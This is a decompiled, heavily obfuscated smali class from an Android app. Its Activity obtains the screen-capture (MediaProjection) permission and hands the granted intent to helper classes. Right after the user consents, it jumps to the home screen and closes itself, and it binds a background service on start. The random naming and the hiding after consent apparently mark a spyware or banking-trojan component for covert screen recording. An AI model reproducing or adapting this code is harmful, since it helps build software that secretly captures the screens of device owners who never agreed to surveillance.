.class public Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/qqazcwjixjaxtrwkqohyvomghsycledalkiguetizmmjghnnpfbdesywvvrtdrfupspzfxclnbokbu;
.super Landroid/app/Activity;


# instance fields
.field private a:Landroid/content/ServiceConnection;

.field public a:Landroid/media/projection/MediaProjectionManager;


# direct methods
.method public constructor <init>()V
    .locals 1

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    new-instance v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/z;

    invoke-direct {v0, p0}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/z;-><init>(Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/qqazcwjixjaxtrwkqohyvomghsycledalkiguetizmmjghnnpfbdesywvvrtdrfupspzfxclnbokbu;)V

    iput-object v0, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/qqazcwjixjaxtrwkqohyvomghsycledalkiguetizmmjghnnpfbdesywvvrtdrfupspzfxclnbokbu;->a:Landroid/content/ServiceConnection;

    return-void
.end method


# virtual methods
.method protected onActivityResult(IILandroid/content/Intent;)V
    .locals 2
    .annotation build Landroid/annotation/TargetApi;
        value = 0x15
    .end annotation

    const/16 v0, 0x4d2

    if-ne p1, v0, :cond_0

    const/4 v0, -0x1

    if-ne p2, v0, :cond_0

    const/4 v0, 0x1

    :try_start_0
    sput-boolean v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->d:Z

    invoke-virtual {p3}, Landroid/content/Intent;->clone()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/content/Intent;

    invoke-static {v0}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/d;->a(Landroid/content/Intent;)V

    iget-object v0, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/qqazcwjixjaxtrwkqohyvomghsycledalkiguetizmmjghnnpfbdesywvvrtdrfupspzfxclnbokbu;->a:Landroid/media/projection/MediaProjectionManager;

    invoke-static {v0}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/d;->a(Landroid/media/projection/MediaProjectionManager;)V

    new-instance v0, Landroid/content/Intent;

    const-string v1, "android.intent.action.MAIN"

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const-string v1, "android.intent.category.HOME"

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addCategory(Ljava/lang/String;)Landroid/content/Intent;

    const/high16 v1, 0x10000000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    invoke-virtual {p0, v0}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/qqazcwjixjaxtrwkqohyvomghsycledalkiguetizmmjghnnpfbdesywvvrtdrfupspzfxclnbokbu;->startActivity(Landroid/content/Intent;)V

    invoke-static {}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/wlxyhrduobsovdunjqqsktmvrgiaetvljbipwpzpheyxxmgzdfoylhmzgcbajifqsketwcaunrcnfk;->b()V

    invoke-virtual {p0}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/qqazcwjixjaxtrwkqohyvomghsycledalkiguetizmmjghnnpfbdesywvvrtdrfupspzfxclnbokbu;->finish()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :cond_0
    :goto_0
    return-void

    :catch_0
    move-exception v0

    goto :goto_0
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 2
    .annotation build Landroid/annotation/TargetApi;
        value = 0x15
    .end annotation

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    new-instance v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/r;

    invoke-direct {v0}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/r;-><init>()V

    invoke-virtual {p0}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/qqazcwjixjaxtrwkqohyvomghsycledalkiguetizmmjghnnpfbdesywvvrtdrfupspzfxclnbokbu;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-class v1, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/qqazcwjixjaxtrwkqohyvomghsycledalkiguetizmmjghnnpfbdesywvvrtdrfupspzfxclnbokbu;

    invoke-static {v0, v1}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/r;->a(Landroid/content/Context;Ljava/lang/Class;)V

    :try_start_0
    const-string v0, "media_projection"

    invoke-virtual {p0, v0}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/qqazcwjixjaxtrwkqohyvomghsycledalkiguetizmmjghnnpfbdesywvvrtdrfupspzfxclnbokbu;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/media/projection/MediaProjectionManager;

    iput-object v0, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/qqazcwjixjaxtrwkqohyvomghsycledalkiguetizmmjghnnpfbdesywvvrtdrfupspzfxclnbokbu;->a:Landroid/media/projection/MediaProjectionManager;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    const/high16 v0, 0x7f040000

    invoke-virtual {p0, v0}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/qqazcwjixjaxtrwkqohyvomghsycledalkiguetizmmjghnnpfbdesywvvrtdrfupspzfxclnbokbu;->setContentView(I)V

    invoke-virtual {p0}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/qqazcwjixjaxtrwkqohyvomghsycledalkiguetizmmjghnnpfbdesywvvrtdrfupspzfxclnbokbu;->getWindow()Landroid/view/Window;

    move-result-object v0

    const/16 v1, 0x7d6

    invoke-virtual {v0, v1}, Landroid/view/Window;->addFlags(I)V

    return-void

    :catch_0
    move-exception v0

    goto :goto_0
.end method

.method public onDestroy()V
    .locals 1

    invoke-super {p0}, Landroid/app/Activity;->onDestroy()V

    iget-object v0, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/qqazcwjixjaxtrwkqohyvomghsycledalkiguetizmmjghnnpfbdesywvvrtdrfupspzfxclnbokbu;->a:Landroid/content/ServiceConnection;

    if-eqz v0, :cond_0

    iget-object v0, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/qqazcwjixjaxtrwkqohyvomghsycledalkiguetizmmjghnnpfbdesywvvrtdrfupspzfxclnbokbu;->a:Landroid/content/ServiceConnection;

    invoke-virtual {p0, v0}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/qqazcwjixjaxtrwkqohyvomghsycledalkiguetizmmjghnnpfbdesywvvrtdrfupspzfxclnbokbu;->unbindService(Landroid/content/ServiceConnection;)V

    :cond_0
    return-void
.end method

.method protected onStart()V
    .locals 3

    invoke-super {p0}, Landroid/app/Activity;->onStart()V

    new-instance v0, Landroid/content/Intent;

    const-class v1, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/wlxyhrduobsovdunjqqsktmvrgiaetvljbipwpzpheyxxmgzdfoylhmzgcbajifqsketwcaunrcnfk;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    iget-object v1, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/qqazcwjixjaxtrwkqohyvomghsycledalkiguetizmmjghnnpfbdesywvvrtdrfupspzfxclnbokbu;->a:Landroid/content/ServiceConnection;

    const/4 v2, 0x1

    invoke-virtual {p0, v0, v1, v2}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/qqazcwjixjaxtrwkqohyvomghsycledalkiguetizmmjghnnpfbdesywvvrtdrfupspzfxclnbokbu;->bindService(Landroid/content/Intent;Landroid/content/ServiceConnection;I)Z

    return-void
.end method
